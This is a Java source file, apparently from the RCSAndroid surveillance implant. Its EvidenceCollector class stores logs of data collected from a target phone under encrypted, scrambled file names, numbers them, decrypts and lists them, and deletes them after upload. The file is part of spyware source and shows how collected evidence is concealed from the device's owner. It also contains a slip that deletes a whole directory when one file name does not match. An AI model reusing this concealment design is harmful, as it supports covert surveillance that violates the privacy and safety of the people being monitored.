/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : EvidenceCollector.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Collection;
import java.util.Date;
import java.util.TreeMap;
import java.util.Vector;

import android.content.Context;

import com.ht.RCSAndroidGUI.agent.Agent;
import com.ht.RCSAndroidGUI.crypto.Encryption;
import com.ht.RCSAndroidGUI.crypto.Keys;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class EvidenceCollector.
 */
public class EvidenceCollector {
	// #ifdef DEBUG
	/** The debug. */
	private static Debug debug = new Debug("EvidenceColl");
	// #endif

	/** The Constant LOG_EXTENSION. */
	public static final String LOG_EXTENSION = ".mob";

	/** The Constant LOG_DIR_PREFIX. */
	public static final String LOG_DIR_PREFIX = "Z"; // Utilizzato per creare le
	// Log Dir
	/** The Constant LOG_DIR_FORMAT. */
	public static final String LOG_DIR_FORMAT = "Z*"; // Utilizzato nella
	// ricerca delle Log Dir
	/** The Constant LOG_PER_DIRECTORY. */
	public static final int LOG_PER_DIRECTORY = 500; // Numero massimo di log
	// per ogni directory
	/** The Constant MAX_LOG_NUM. */
	public static final int MAX_LOG_NUM = 25000; // Numero massimo di log che

	/** The Constant PROG_FILENAME. */
	private static final String PROG_FILENAME = "pr_80";

	/** The seed. */
	int seed;

	/** The singleton. */
	private volatile static EvidenceCollector singleton;

	/**
	 * Self.
	 *
	 * @return the evidence collector
	 */
	public static EvidenceCollector self() {
		if (singleton == null) {
			synchronized (EvidenceCollector.class) {
				if (singleton == null) {
					singleton = new EvidenceCollector();
				}
			}
		}

		return singleton;
	}

	/**
	 * Decrypt name.
	 * 
	 * @param logMask
	 *            the log mask
	 * @return the string
	 */
	public static String decryptName(final String logMask) {
		return Encryption
				.decryptName(logMask, Keys.self().getChallengeKey()[0]);
	}

	/**
	 * Encrypt name.
	 * 
	 * @param logMask
	 *            the log mask
	 * @return the string
	 */
	public static String encryptName(final String logMask) {
		byte[] key = Keys.self().getChallengeKey();
		return Encryption
				.encryptName(logMask, key[0]);
	}

	// public boolean storeToMMC;
	/** The log vector. */
	Vector logVector;

	/** The log progressive. */
	private int logProgressive;

	// Keys keys;

	/**
	 * Instantiates a new log collector.
	 */
	private EvidenceCollector() {
		super();
		logVector = new Vector();

		logProgressive = deserializeProgressive();
		// keys = Encryption.getKeys();
		// seed = keys.getChallengeKey()[0];
	}

	/**
	 * Clear.
	 */
	private void clear() {

	}

	/**
	 * Removes the progressive.
	 */
	public synchronized void removeProgressive() {
		// #ifdef DEBUG
		debug.info("Removing Progressive");
		// #endif

		final Context content = Status.getAppContext();
		content.deleteFile(PROG_FILENAME);
	}

	/**
	 * Deserialize progressive.
	 *
	 * @return the int
	 */
	private synchronized int deserializeProgressive() {
		final Context content = Status.getAppContext();
		int progessive = 0;
		try {
			final FileInputStream fos = content.openFileInput(PROG_FILENAME);

			final byte[] prog = new byte[4];
			fos.read(prog);
			progessive = Utils.byteArrayToInt(prog, 0);

			fos.close();
		} catch (final IOException e) {
			debug.error(e);
		}

		return progessive;
	}

	/**
	 * Factory.
	 *
	 * @param agent the agent
	 * @return the log
	 */
	public synchronized Evidence factory(final Agent agent) {
		final Evidence log = new Evidence(agent.getId());
		return log;
	}

	/**
	 * Gets the new progressive.
	 * 
	 * @return the new progressive
	 */
	protected synchronized int getNewProgressive() {
		logProgressive++;

		final Context content = Status.getAppContext();
		try {
			final FileOutputStream fos = content.openFileOutput(PROG_FILENAME,
					Context.MODE_PRIVATE);

			fos.write(Utils.intToByteArray(logProgressive));
			fos.close();
		} catch (final IOException e) {
			debug.error(e);
		}

		// #ifdef DEBUG
		debug.trace("Progressive: " + logProgressive);

		// #endif
		return logProgressive;
	}

	/**
	 * Make date name.
	 *
	 * @param date the date
	 * @return the string
	 */
	private static String makeDateName(final Date date) {
		final long millis = date.getTime();
		final long mask = (long) 1E4;
		final int lodate = (int) (millis % mask);
		final int hidate = (int) (millis / mask);

		final String newname = Integer.toHexString(lodate)
				+ Integer.toHexString(hidate);

		return newname;
	}

	/**
	 * Make new name.
	 *
	 * @param log the log
	 * @param logType the log type
	 * @return the vector
	 */
	public synchronized Vector makeNewName(final Evidence log,
			final String logType) {
		final Date timestamp = log.timestamp;
		final int progressive = getNewProgressive();

		// #ifdef DBC
		Check.asserts(progressive >= 0, "makeNewName fail progressive >=0");
		// #endif

		final Vector vector = new Vector();
		final String basePath = Path.logs();

		final String blockDir = "l_" + (progressive / LOG_PER_DIRECTORY);

		// http://www.rgagnon.com/javadetails/java-0021.html
		final String mask = "0000";
		final String ds = Long.toString(progressive % 10000); // double to
		// string
		final int size = mask.length() - ds.length();
		// #ifdef DBC
		Check.asserts(size >= 0, "makeNewName: failed size>0");
		// #endif

		final String paddedProgressive = mask.substring(0, size) + ds;

		final String fileName = paddedProgressive + "" + logType + ""
				+ makeDateName(timestamp);

		final String encName = encryptName(fileName + LOG_EXTENSION);

		// #ifdef DBC
		Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName
				+ " ch: " + seed + " not scrambled: " + fileName
				+ LOG_EXTENSION);
		// #endif

		vector.addElement(new Integer(progressive));
		vector.addElement(basePath); // 
		vector.addElement(blockDir); // 1
		vector.addElement(encName); // ?
		vector.addElement(fileName); // unencrypted file
		return vector;
	}

	/**
	 * Removes the.
	 * 
	 * @param logName
	 *            the log name
	 */
	public void remove(final String logName) {
		// #ifdef DEBUG
		debug.trace("Removing file: " + logName);
		// #endif
		final AutoFile file = new AutoFile(logName);
		if (file.exists()) {
			file.delete();
		} else {
			// #ifdef DEBUG
			debug.warn("File doesn't exists: " + logName);
			// #endif
		}
	}

	/**
	 * Rimuove i file uploadati e le directory dei log dal sistema e dalla MMC.
	 *
	 * @param numFiles the num files
	 * @return the int
	 */

	public synchronized int removeLogDirs(final int numFiles) {
		// #ifdef DEBUG
		debug.info("removeLogDirs");
		// #endif

		int removed = 0;

		removed = removeLogRecursive(Path.logs(), numFiles);
		return removed;
	}

	/**
	 * Removes the log recursive.
	 *
	 * @param basePath the base path
	 * @param numFiles the num files
	 * @return the int
	 */
	private int removeLogRecursive(final String basePath, final int numFiles) {

		// #ifdef DEBUG
		debug.info("RemovingLog: " + basePath + " numFiles: " + numFiles);
		// #endif

		int numLogsDeleted = 0;

		File fc;
		try {
			fc = new File(basePath);

			if (fc.isDirectory()) {
				final String[] fileLogs = fc.list();

				for (final String file : fileLogs) {

					// #ifdef DEBUG
					debug.trace("removeLog: " + file);

					// #endif
					final int removed = removeLogRecursive(basePath + file,
							numFiles - numLogsDeleted);
					// #ifdef DEBUG
					debug.trace("removeLog removed: " + removed);
					// #endif

					numLogsDeleted += removed;
				}
			}

			fc.delete();
			numLogsDeleted += 1;

		} catch (final Exception e) {
			// #ifdef DEBUG
			debug.error("removeLog: " + basePath + " ex: " + e);
			// #endif
		}

		// #ifdef DEBUG
		debug.trace("removeLogRecursive removed: " + numLogsDeleted);
		// #endif
		return numLogsDeleted;

	}

	/**
	 * Restituisce la lista ordinata dele dir secondo il nome.
	 * 
	 * @param currentPath
	 *            the current path
	 * @return the vector
	 */
	public Vector scanForDirLogs(final String currentPath) {
		// #ifdef DBC
		Check.requires(currentPath != null, "null argument");
		// #endif

		File fc;

		final Vector vector = new Vector();
		try {

			fc = new File(currentPath);
			if (fc.isDirectory()) {
				final String[] fileLogs = fc.list();

				for (final String dir : fileLogs) {
					final File fdir = new File(currentPath + dir);
					if (fdir.isDirectory()) {

						vector.addElement(dir + "/");
						// #ifdef DEBUG
						debug.trace("scanForDirLogs adding: " + dir);
						// #endif

					}
				}

			}

		} catch (final Exception e) {
			// #ifdef DEBUG
			debug.error("scanForDirLogs: " + e);
			// #endif

		}

		// #ifdef DEBUG
		debug.trace("scanForDirLogs #: " + vector.size());

		// #endif

		return vector;
	}

	/**
	 * Estrae la lista di log nella forma *.MOB dentro la directory specificata
	 * da currentPath, nella forma 1_n Restituisce la lista ordinata secondo il
	 * nome demangled
	 * 
	 * @param currentPath
	 *            the current path
	 * @param dir
	 *            the dir
	 * @return the vector
	 */
	public String[] scanForEvidences(final String currentPath, final String dir) {
		// #ifdef DBC
		Check.requires(currentPath != null, "null argument");
		Check.requires(!currentPath.startsWith("file://"),
				"currentPath shouldn't start with file:// : " + currentPath);
		// #endif

		final TreeMap<String, String> map = new TreeMap<String, String>();

		File fcDir = null;
		// FileConnection fcFile = null;
		try {
			fcDir = new File(currentPath + dir);

			final String[] fileLogs = fcDir.list();

			for (final String file : fileLogs) {
				// fcFile = (FileConnection) Connector.open(fcDir.getURL() +
				// file);
				// e' un file, vediamo se e' un file nostro
				final String logMask = EvidenceCollector.LOG_EXTENSION;
				final String encLogMask = encryptName(logMask);

				if (file.endsWith(encLogMask)) {
					// String encName = fcFile.getName();
					// #ifdef DEBUG
					debug.trace("enc name: " + file);
					// #endif
					final String plainName = decryptName(file);
					// #ifdef DEBUG
					debug.info("plain name: " + plainName);
					// #endif

					map.put(plainName, file);
				}else{
					// #ifdef DEBUG
					debug.info("wrong name, deleting: " + file);
					// #endif
					fcDir.delete();
				}
			}

		} catch (final Exception e) {
			// #ifdef DEBUG
			debug.error("scanForLogs: " + e);
			// #endif

		} finally {

		}

		// #ifdef DEBUG
		debug.trace("scanForLogs numDirs: " + map.size());
		// #endif
		final Collection<String> val = map.values();

		return map.values().toArray(new String[] {});
	}

	//
	/**
	 * Init logs.
	 */
	public void initEvidences() {
		clear();

		Path.makeDirs();
	}
}
